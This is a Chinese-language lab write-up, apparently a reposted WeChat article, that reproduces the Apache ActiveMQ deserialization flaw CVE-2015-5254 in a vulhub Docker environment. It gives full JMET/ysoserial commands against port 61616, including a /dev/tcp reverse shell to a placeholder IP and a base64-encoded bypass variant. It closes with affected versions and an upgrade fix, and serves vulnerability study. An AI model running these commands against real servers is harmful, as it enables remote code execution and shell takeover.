> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aqD7VIdzPpe2uKOFuQJxxw)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa260lZABWwEo49lodRtpGIOor5ICf3PeT155y2nHC0aGNudfnDegOD0sibZMLBVyvxNiaxKibIT9cHzEw/640?wx_fmt=png)

ActiveMQ 反序列化漏洞复现 (CVE-2015-5254)

**前言：**

Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持 Java 消息服务、集群、Spring Framework 等。由于 ActiveMQ 是一个纯 Java 程序，因此只需要操作系统支持 Java 虚拟机，ActiveMQ 便可执行。

### **漏洞描述：**

### Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码。

### 使用 vulhub 进行搭建漏洞环境

```
# 进入某一个漏洞/环境的目录
cd  activemq/CVE-2015-5254/
# 启动运行环境
docker-compose -up -d
```

**漏洞复现：**

1. 构造（可以使用 ysoserial）可执行命令的序列化对象  
2. 作为一个消息，发送给目标 61616 端口  
3. 访问 web 管理页面，读取消息，触发漏洞的 jar 文件，并在同目录下创建一个 external 文件夹（否则可能会爆文件夹不存在的错误）。

工具：JMET

使用详情：

https://github.com/matthiaskaiser/jmet

下载地址：  

https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar

创建队列消息并写入命令。  

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -Yp ROME ip  61616
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpPANyNX89TkanlsJRRTWFGNJJpRUNWiczGg73Vdv84jMM1eK7tZYtTww/640?wx_fmt=jpeg)

进入容器转到 / tmp 目录下，发现没有创建文件，这是因为当执行命令后会给目标的 ActiveMQ 添加一个名为 event 的队列, 通过访问

http://ip:8161/admin/browse.jsp?JMSDestination=event

看到这个队列中所有的消息。

```
#列出所有在运行的容器信息。
docker ps
#进入容器
docker exec -it  cc0e9385f975  /bin/bash
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpamCSpPFHib4L85iaIO6PCgEE1EoDGYdRR6Yux0rVbsrLgCXNHNBejZOw/640?wx_fmt=png)  

点击触发后，执行命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpZ0BwQckXvOJO3G0Yl7fjIW0RbbEhiapef9Pnt9KSVkEGw5BTgwCeJQw/640?wx_fmt=png)

命令执行成功。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpkFfKgqR5n2x5er5gG02TAWPrujsol7WzBRoNNgibNrqkO7TnkjeX6Ug/640?wx_fmt=png)

反弹 shell

直接反弹时无法成功。可以通过 base64 进行反弹。

无法反弹。

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/ip/7777 0>&1" -Yp ROME  ip 61616
```

base64 绕过。  

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo payload的basse64编码}|{base64,-d}|{bash,-i}" -Yp ROME  ip 61616
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpMDQFeUS3DGM4noV4KUDcP2UoYpiarLfeVTcLXJxzeowBrNDadhxIc6g/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpD7X1NyXOk3SAG3lyh13lYN4HMR3ecHndQ4p7CSL3u1JLMe6yQJJhOQ/640?wx_fmt=png)

反弹成功。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa27qPMD9tmn9CewY9hsibpyDpubuCKFceSNuBKkW7CibvMlZBWkxszrGebZ8DH1qzibLd4cIAkAYiaD7EQ/640?wx_fmt=png)

**影响版本**

        Apache ActiveMQ <5.13.x

**修复建议**

        升级到最新版本

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa260lZABWwEo49lodRtpGIOoYYt5Ojm4Y1sdMD4ez7rL55g1IW3icCTOia91YicOrh1sjuOB5TiaUibCiaiaA/640?wx_fmt=jpeg)

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。